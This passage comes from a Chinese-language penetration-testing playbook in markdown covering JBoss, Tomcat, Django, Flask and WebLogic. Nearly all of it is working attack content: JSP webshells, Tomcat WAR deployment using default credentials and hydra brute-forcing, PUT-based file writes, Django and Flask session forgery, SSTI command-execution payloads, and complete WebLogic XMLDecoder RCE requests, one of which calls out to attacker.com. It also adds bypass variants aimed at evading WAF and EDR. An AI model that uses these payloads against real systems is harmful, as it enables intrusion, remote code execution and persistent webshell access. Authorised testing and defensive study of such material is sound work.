# 构造恶意脚本
import java.io.*;
Runtime rt = Runtime.getRuntime();
Process p = rt.exec("id");
InputStream is = p.getInputStream();
BufferedReader reader = new BufferedReader(new InputStreamReader(is));
String line;
while((line = reader.readLine()) != null) {
    print(line);
}
```

**4. 4. 使用工具**
_使用JexBoss工具_
```
# JexBoss
git clone https://github.com/joaomatosf/jexboss
cd jexboss
python jexboss.py -host http://target

# 自动化利用
python jexboss.py -mode file-scan -file hosts.txt
```

**WAF/EDR 绕过变体：**

**1. 端点变体**
_端点变体_
```
# 不同端点
/invoker/JMXInvokerServlet
/invoker/EJBInvokerServlet
/invoker/readonly/JMXInvokerServlet
/jmx-console/
/web-console/
```

---

### Apache Tomcat漏洞  `tomcat-vuln`
Apache Tomcat服务器漏洞利用
子类：**Tomcat** · tags: `tomcat` `rce` `java` `manager`

**前置条件：** 使用Tomcat服务器；存在漏洞版本或配置

**攻击链：**

**1. 1. Manager App弱口令**
_Manager App弱口令_
```
# 访问Manager App
http://target/manager/html

# 常见弱口令
tomcat:tomcat
admin:admin
admin:tomcat

# 使用工具爆破
hydra -l tomcat -P passwords.txt target http-get /manager/html
```

**2. 2. 部署War包**
_部署War包_
```
# 生成恶意War包
# cmd.jsp
<%@ page import="java.util.*,java.io.*"%>
<% String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while((line = br.readLine()) != null) { out.println(line); }
%>

# 打包
jar cvf shell.war cmd.jsp

# 通过Manager上传
curl -u tomcat:tomcat -T shell.war "http://target/manager/deploy?path=/shell"

# 访问Shell
http://target/shell/cmd.jsp?cmd=id
```

**3. 3. CVE-2020-1938 Ghostcat**
_CVE-2020-1938 Ghostcat_
```
# AJP文件读取/包含
# 使用工具
git clone https://github.com/chaitin/xray
cd xray
./xray_linux_amd64 webscan --plugins phantomjs --url http://target

# 或使用专用工具
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
cd CNVD-2020-10487-Tomcat-Ajp-lfi
python CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/web.xml target
```

**4. 4. PUT方法任意文件写入**  _[windows]_
_PUT方法任意文件写入_
```
# CVE-2017-12615
# Windows下PUT方法写文件
PUT /shell.jsp%20 HTTP/1.1
Host: target
Content-Length: 24

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# 或使用::$DATA
PUT /shell.jsp::$DATA HTTP/1.1

# 或使用/
PUT /shell.jsp/ HTTP/1.1
```

**WAF/EDR 绕过变体：**

**1. 文件名绕过**
_文件名绕过_
```
# 不同文件名变体
shell.jsp%20
shell.jsp::$DATA
shell.jsp/
shell.jsp%00
shell.jSp
shell.jsP
```

---

### Django框架漏洞  `django-vuln`
Django框架安全漏洞
子类：**Django** · tags: `django` `python` `framework` `sql`

**前置条件：** 使用Django框架；存在漏洞版本

**攻击链：**

**1. 1. SQL注入**
_CVE-2020-7471 SQL注入_
```
# CVE-2020-7471
# 通过PostgreSQL输入验证绕过
# 使用JSONField/HStoreField

# 构造恶意查询
Model.objects.filter(data__contains={"key": "value; DROP TABLE users;--"})

# 或使用ArrayField
Model.objects.filter(tags__contains=["tag'); DROP TABLE users;--"])

# 触发SQL注入
```

**2. 2. 调试模式信息泄露**
_调试模式信息泄露_
```
# DEBUG=True时
# 错误页面泄露:
- 源代码
- 环境变量
- 数据库配置
- SECRET_KEY
- 服务器路径

# 访问不存在的页面触发错误
http://target/nonexistent

# 或触发异常
```

**3. 3. SECRET_KEY利用**
_SECRET_KEY利用_
```
# 获取SECRET_KEY后
# 可以:
# 1. 签名伪造Session
# 2. 签名伪造CSRF Token
# 3. 密码重置Token

# 使用django-session-cleanup工具
# 或手动解签

import django.core.signing as signing

# 解签Session
signing.loads(session_value, key=SECRET_KEY)

# 签名伪造Session
fake_session = signing.dumps({"user_id": 1}, key=SECRET_KEY)
```

**4. 4. 路径遍历**
_路径遍历漏洞_
```
# CVE-2021-28658
# Django静态文件路径遍历
GET /static/../../../../etc/passwd

# 使用工具检测
curl http://target/static/../../../../etc/passwd
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
# URL编码
/static/%2e%2e/%2e%2e/etc/passwd

# 双重编码
/static/%252e%252e/%252e%252e/etc/passwd

# Unicode编码
/static/..%c0%af..%c0%af/etc/passwd
```

---

### Flask框架漏洞  `flask-vuln`
Flask框架安全漏洞
子类：**Flask** · tags: `flask` `python` `framework` `ssti`

**前置条件：** 使用Flask框架；存在漏洞配置

**攻击链：**

**1. 1. SSTI模板注入**
_SSTI模板注入_
```
# Jinja2模板注入探测
{{7*7}}
${7*7}
<%= 7*7 %>

# 如果返回49则存在SSTI

# 获取配置
{{config}}
{{self.__class__}}

# 命令执行
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**2. 2. SECRET_KEY利用**
_SECRET_KEY利用_
```
# Flask Session签名
# 获取SECRET_KEY后可以伪造Session

# 解签Session
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

# 解签
def decode_session(cookie_value, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.loads(cookie_value)

# 签名伪造
def encode_session(data, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.dumps(data)

# 伪造管理员Session
fake_session = encode_session({"user_id": 1, "is_admin": True}, SECRET_KEY)
```

**3. 3. 调试模式RCE**
_调试模式RCE_
```
# Flask Debug模式
# 访问/debug或/console
# 可以执行任意Python代码

# Werkzeug Debug Console
# 访问:
http://target/console

# 执行代码
import os; os.system('id')
__import__('os').system('id')
```

**4. 4. PIN码绕过**
_PIN码绕过_
```
# Flask Debug PIN
# 需要获取:
# 1. 用户名
# 2. modname
# 3. app路径
# 4. MAC地址

# 读取信息
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].environ}}

# 计算PIN
# 使用脚本计算Werkzeug PIN
```

**WAF/EDR 绕过变体：**

**1. SSTI绕过**
_SSTI绕过_
```
# 过滤绕过
# 使用attr
{{''|attr('__class__')|attr('__mro__')}}

# 使用request
{{request|attr('application')|attr('__globals__')}}

# 使用字符串拼接
{{'__cla'~'ss__'}}

# 使用编码
{{''['\x5f\x5fclass\x5f\x5f']}}
```

---

### WebLogic XMLDecoder  `weblogic-xmldecoder`
利用WebLogic Server中XMLDecoder反序列化漏洞(CVE-2017-10271/CVE-2017-3506)实现远程代码执行
子类：**WebLogic** · tags: `weblogic` `xmldecoder` `rce`

**前置条件：** 目标运行WebLogic Server；存在/wls-wsat/或/_async/路径；XMLDecoder组件未被禁用；WebLogic版本存在漏洞(10.3.6.0/12.1.3.0等)

**攻击链：**

**1. 探测WebLogic版本和路径**  _[linux]_
_探测WebLogic服务器版本、开放端口和可利用的端点_
```
# 检测WebLogic控制台
curl -sI "http://target:7001/console/" | head -5

# 检测wls-wsat端点(CVE-2017-10271)
curl -s "http://target:7001/wls-wsat/CoordinatorPortType" | head -20

# 检测AsyncResponseService端点(CVE-2019-2725)
curl -s "http://target:7001/_async/AsyncResponseService" | head -20

# 检测T3协议
nmap -sV -p 7001 --script weblogic-t3-info target
```

**2. CVE-2017-10271 XMLDecoder RCE**  _[linux]_
_通过SOAP请求中的WorkContext注入XMLDecoder反序列化payload实现命令执行_
```
curl -v "http://target:7001/wls-wsat/CoordinatorPortType"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id > /tmp/test_rce.txt</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'
```

**3. CVE-2019-2725 反序列化RCE**  _[linux]_
_利用_async端点的反序列化漏洞执行外带验证(OOB)_
```
curl -v "http://target:7001/_async/AsyncResponseService"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
          <void index="0"><string>/bin/bash</string></void>
          <void index="1"><string>-c</string></void>
          <void index="2"><string>curl http://attacker.com/callback?rce=success</string></void>
        </array>
        <void method="start"/>
      </void>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body>
</soapenv:Envelope>'
```

**4. 写入Webshell获取持久权限**  _[linux]_
_利用XMLDecoder的PrintWriter写入JSP webshell到WebLogic部署目录_
```
# 通过XMLDecoder写入JSP Webshell
curl "http://target:7001/wls-wsat/CoordinatorPortType"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.io.PrintWriter">
          <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
          <void method="println">
            <string><![CDATA[<%if("test".equals(request.getParameter("pwd"))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a=-1;byte[]b=new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}}%>]]></string>
          </void>
          <void method="close"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'

# 验证Webshell
curl "http://target:7001/bea_wls_internal/test.jsp?pwd=test&cmd=id"
```

**WAF/EDR 绕过变体：**

**1. 备用反序列化端点**
_尝试WebLogic WLS-WSAT组件的多个不同SOAP端点，部分端点可能未被WAF规则覆盖_
```
# 尝试不同的XMLDecoder入口
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/CoordinatorPortType
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/CoordinatorPortType11
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/ParticipantPortType
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/RegistrationPortTypeRPC
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/RegistrationRequesterPortType
```

**2. T3/IIOP协议绕过HTTP层WAF**
_使用T3或IIOP协议发送反序列化payload，绕过仅检测HTTP流量的WAF_
```
# T3协议利用（绕过HTTP层WAF）
python3 weblogic_t3_exploit.py -t target:7001 -c "id"

# IIOP协议利用
python3 weblogic_iiop_exploit.py -t target:7001 -c "whoami"

# 使用ysoserial生成T3 payload
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/test" | python3 t3_send.py target 7001
```

**3. XML编码混淆绕过**
_通过XML编码（UTF-16/CDATA/实体编码）混淆payload内容绕过基于内容匹配的WAF_
```
<!-- UTF-16编码绕过 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- CDATA包裹关键字 -->
<java>
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0"><string><![CDATA[/bin/sh]]></string></void>
      <void index="1"><string><![CDATA[-c]]></string></void>
      <void index="2"><string><![CDATA[id]]></string></void>
    </array>
    <void method="start"/>
  </object>
</java>
```

---


---

← 回 [00-index.md](00-index.md) · 相关:[`12-deserialization.md`](12-deserialization.md)(通用反序列化)
